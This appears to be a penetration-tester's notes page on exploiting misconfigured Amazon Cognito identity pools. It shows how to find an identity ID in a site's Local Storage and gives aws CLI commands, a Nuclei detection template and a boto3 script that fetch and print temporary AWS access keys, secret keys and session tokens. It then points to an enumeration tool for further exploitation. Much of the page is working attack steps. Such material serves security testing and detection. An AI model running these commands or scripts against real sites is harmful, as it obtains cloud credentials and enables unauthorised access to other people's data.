# Amazon Cognito missconfiguration



## Detech

```
us-east-1:xxx
us-east-2:xxx
us-west-1:xxx
us-west-2:xxx
eu-west-1:xxx
eu-west-2:xxx
eu-west-3:xxx
eu-north-1:xxx
eu-central-1:xxx
ap-south-1:xxx
ap-southeast-1:xxx
ap-southeast-2:xxx
ap-northeast-1:xxx
ap-northeast-2:xxx
ap-northeast-3:xxx
sa-east-1:xxx
ca-central-1:xxx
cn-north-1:xxx
cn-northwest-1:xxx
```

## How found

```
Found 
- com.amplify.Cognito.eu-west-1.blalalalalalalalalala.identityId
- Value (eu-west-1:e3923078-cccc-bbbb-aaaa-xxxxxxxxxxxx)
both in Local Storage (always should check Local Storage)

use command:

aws cognito-identity get-credentials-for-identity \n
--identity-id "eu-west-1:e3923078-cccc-bbbb-aaaa-xxxxxxxxxxxx"

Data
{
Credentials:
    { "Access..": ...
    "SecretKey": ...
    "SessionToken": ...
    }
    
    
```

Nuclei template

```
id: Exposed-aws-Identity-Pool-Id

info:
      name: AWS Identity Pool Id
      author: B0d4
      severity: critical
      reference:
        - https://docs.aws.amazon.com/cognito/latest/developerguide/identity-pools.html
      metadata:
        verified: true
        max-request: 1
      tags: disclosure,aws,exposure,amazon
http:
    - method: GET
      path:
        - "{{BaseURL}}"

      extractors:
        - type: regex
          part: body
          regex:
              - \b(?:us-east-1|us-east-2|us-west-1|us-west-2|eu-west-1|eu-west-2|eu-west-3|eu-north-1|eu-central-1|ap-south-1|ap-southeast-1|ap-southeast-2|ap-northeast-1|ap-northeast-2|ap-northeast-3|sa-east-1|ca-central-1|cn-north-1|cn-northwest-1):[a-z0-9-]+\b
```

Credit: [https://github.com/Wh02m1/nuclei-templete-for-Exposed-Idenetity-Pool-Id/](https://github.com/Wh02m1/nuclei-templete-for-Exposed-Idenetity-Pool-Id/)



<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

```
Next use that access and secret key access data

aws configure --profile profiletest

because of that session have  time to out, we should config in

~/.aws/credentials

Manual add line aws_session_token is SessionToken

Or use this python script

import boto3

region='region_here'
identity_pool='identity_Pool_Id_here'

client = boto3.client('cognito-identity',region_name=region)
_id = client.get_id(IdentityPoolId=identity_pool)
_id = _id['IdentityId']

credentials = client.get_credentials_for_identity(IdentityId=_id)
access_key = credentials['Credentials']['AccessKeyId']
secret_key = credentials['Credentials']['SecretKey' ]
session_token = credentials['Credentials']['SessionToken']
identity_id = credentials['IdentityId']
print("Access Key: " + access_key)
print("Secret Key: " + secret_key)
print("Session Token: " + session_token)
print("Identity Id: " + identity_id)
```

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

```
Next test 

aws sts get-caller-identity --profile profiletest

use tools to exploit
https://github.com/NotSoSecure/cloud-service-enum.git
```

{% embed url="https://awstip.com/how-i-exploited-amazon-cognito-misconfigurations-to-access-confidential-s3-data-badb62cabfab" %}
